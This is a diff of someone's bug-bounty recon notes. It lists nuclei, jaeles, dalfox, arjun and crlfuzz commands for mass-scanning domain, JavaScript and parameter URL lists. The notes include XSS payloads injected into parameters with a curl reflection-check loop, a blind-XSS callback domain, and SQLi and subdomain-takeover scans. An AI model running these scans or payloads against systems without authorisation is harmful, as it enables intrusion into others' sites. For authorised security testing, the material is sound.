@@ -23,9 +23,6 @@ refer cves/testing.txt
 
 
 3.nuclei  and jaeles
-1.normal templates
-2.lost-templates
-3.downloaded-templates
 
 
 
@@ -37,22 +34,25 @@ refer cves/testing.txt
 1.run on domain name and subdomains names:
 
 //nuclei
-nuclei -l livedomains.txt  -s critical,high,medium,low -o nuclei_domain_out
-nuclei -l livedomains.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_domain1_out
-nuclei -l livedomains.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_domain1_out
+nuclei -l livedomains.txt  -s critical,high,medium,low,info -o nuclei_domain1_out
+nuclei -l livedomains.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_domain2_out
+nuclei -l livedomains.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_domain3_out
+nuclei -l domains.txt -t /home/maddy/nuclei-templates/http/misconfiguration -o nuclei_domain4.txt
 
 //jaeles
-jaeles scan -c 50  -U livedomains.txt
+jcat livedomains.txt| jaeles scan
 //output:out
 
 2.run on js files:
 //nuclei
-nuclei -l jsurls.txt -s critical,high,medium,low -o nuclei_js_out
-nuclei -l jsurls.txt -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_domain1_out
-nuclei -l jsurls.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_domain1_out
+nuclei -l jsurls.txt -s critical,high,medium,low -o nuclei_js1_out
+nuclei -l jsurls.txt -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_js2_out
+nuclei -l jsurls.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_js3_out
+nuclei -l jsurls.txt -s critical,high,medium,low -t /home/maddy/nuclei-templates/javascript -o nuclei_js4_out
+nuclei -l jsurls.txt -s critical,high,medium,low -t /home/maddy/nuclei-templates/http/exposures -o nuclei_js5_out
 
 //jaeles
-jaeles scan   -U jsurls.txt
+jcat jsurls.txt| jaeles scan
 
 ----------------------------------2.AUTOMATION RUN ON SPECIFIC URLS ACC TO VULNERABILITY : (RUN SPCIFIC TEMPLATES ALSO RUN ALL TEMPLATES...)----------------------------------------
 
@@ -76,12 +76,15 @@ jaeles scan   -U jsurls.txt
 # running nuclei,jaeles in parametrized urls...
 
 //nuclei
-nuclei -l all_params.txt  -s critical,high,medium,low -o nuclei_domain_out
-nuclei -l all_params.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_domain1_out
-nuclei -l all_params.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_domain1_out
+
+
+nuclei -l all_params.txt  -s critical,high,medium,low -o nuclei_param1_out
+nuclei -l all_params.txt -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/downloaded_all_nucleitemplates/ -s critical,high,medium,low -o nuclei_param2_out
+nuclei -l all_params.txt  -t /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/nuclei-temp/lostsec/ -s critical,high,medium,low -o nuclei_param3_out
+nuclei -l all_params.txt -t /home/maddy/nuclei-templates/dast -s critical,high,medium,low -o nuclei_param4_out
 
 //jaeles
-jaeles scan  -U all_params.txt
+jcat all_params.txt| jaeles scan
 //output:out
 
 
@@ -89,8 +92,21 @@ jaeles scan  -U all_params.txt
 SQLI,XSS AND OD AUTOMATION:
 
 
-#FINDING HIDDEN PARAMS
+#FINDING HIDDEN PARAMS (if result found then we can test for vuln according to hidden parameter)
 	cat params.txt | xargs -I % arjun -u "%" -oT hidden_params.txt
+	while read url; do   echo "[$(date '+%T')] Scanning: $url" | tee -a hidden_params.txt;   echo "==== URL: $url ====" >> hidden_params.txt;   arjun  --stable -u "$url" -oT - >> hidden_params.txt;   echo -e "\n" >> hidden_params.txt;   sleep 2; done < params.txt
+
+[[[ Check for reflection of that hidden param in response and understnad the role of that parameter,
+
+Use tools like Burp Suite or Postman to intercept requests and modify hidden parameters.
+
+Test for input validation issues (e.g., SQLi payloads, XSS payloads).
+
+Check if changing the param affects authorization (e.g., access to other user’s data).
+
+Try injecting payloads relevant to command injection or other vulnerabilities. ]]]]
+
+
 
 ### **SQL Injection (SQLi) Automation**
 
@@ -99,27 +115,27 @@ SQLI,XSS AND OD AUTOMATION:
 		
 	
 	3.nuclei: (input: filtered_params_urls)
-	=>for sql:  cat sql.txt | nuclei -t /prsnl/errsqli.yaml
-	=>for sql:  cat sql.txt | nuclei -t /prsnl/timesqli.yaml -dast
-	
-	nuclei -l filtered_urls.txt -t  "cves/202*/**" "vulnerabilities/sql/" -o sqli_results.txt -silent -rate-limit 200 -retries 2
+	nuclei -tags sqli,injection,error,blind,time,post,database,mysql,postgresql,mssql,azure-sql,google-cloud-sql,dast  -rate-limit 200 -retries 2 -l all_params.txt -o sqli_results.txt
 
+	
 
 ### **Cross-Site Scripting (XSS) Automation**
 
+	1.using dalfox. (input: filtered_params_urls)
+	dalfox file all_params.txt --deep --blind xss.yourdomain.com
+	dalfox -b <payload> file all_params.txt
 
 
-	1.using parameterized output: (input: filtered_params_urls)
-	cat urls.txt | grep -E '\?[^=]+=.+$' | sed 's/\(.*=\).*/\1<script>alert(1)<\/script>/' | xargs -I {} curl -s -k {}
+	2.cat all_params.txt | qsreplace '"/><script>confirm(1)</script>' > xss.txt && \
+while read host; do
+  echo "Testing: $host"
+  if curl --silent --path-as-is --insecure "$host" | grep -q "<script>confirm(1)</script>"; then
+    echo -e "$host [VULNERABLE]" | tee -a xss_results.txt
+  else
+    echo -e "$host [Not Vulnerable]" | tee -a xss_results.txt
+  fi
+done < xss.txt
 
-
-	2.using dalfox. (input: filtered_params_urls)
-	dalfox file params.txt --deep --blind xss.yourdomain.com
-	dalfox -b <payload> file urls.xss
-
-
-	3.paramspider -d target.com | qsreplace  '"/><script>confirm(1)</script>' > xss.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" 
-	| grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
 
 ### **Server-Side Request Forgery (SSRF) Automation**
 
@@ -203,36 +219,33 @@ done
 
 
 
-#automate s3
-s3:
-nuclei -t s3-bucket-takeover.yaml -u http://<bucket-name>.s3.amazonaws.com
 
 
 #rsubdomain takeover:
+
 using nuclei:
-nuclei -l domains.txt -t /http/takeovers/ -o out.txt
-nuclei -l hosts.txt -t subdomain-takeover-detect-all-takeovers.yaml
+nuclei -l livedomains.txt -t /home/maddy/nuclei-templates/http/takeovers -o takeover_out1.txt
+nuclei -l livedomains.txtt -t /home/maddy/nuclei-templates/profiles/subdomain-takeovers.yml -o takeover_out2.txt
+
 using subzy:
-subzy run -targets domains.txt
+subzy run --targets domains.txt
 
 
 #automating wordpress:
 
-nuclei -u https://target.com -t wordpress/
-cat alive.txt | nuclei -t ~/nuclei-templates/technologies/wordpress-detect.yaml
-
+nuclei -l livedomains.txt -t /home/maddy/nuclei-templates/http/vulnerabilities/wordpress -o wordpress1_out
+cat alive.txt | nuclei -t /home/maddy/nuclei-templates/http/technologies/wordpress-detect.yaml -o wordpress2_out
 
 #automating cors:
-nuclei -l domains.txt -tags cors
+nuclei -l domains.txt -tags cors -o nuclei_cors.txt
 
 #-------------------crlf--------------------------
 using crlfi:
-crlfi -i domains.txt
+crlfi -i domains.txt -o crlfi.txt
 
 using crlfuzz:
 crlfuzz -l domains.txt | tee -a output.txt
 crlfuzz -l urls.txt | tee -a output.txt
-
 
 using crlfsuite:
 crlfsuite -iT domains.txt
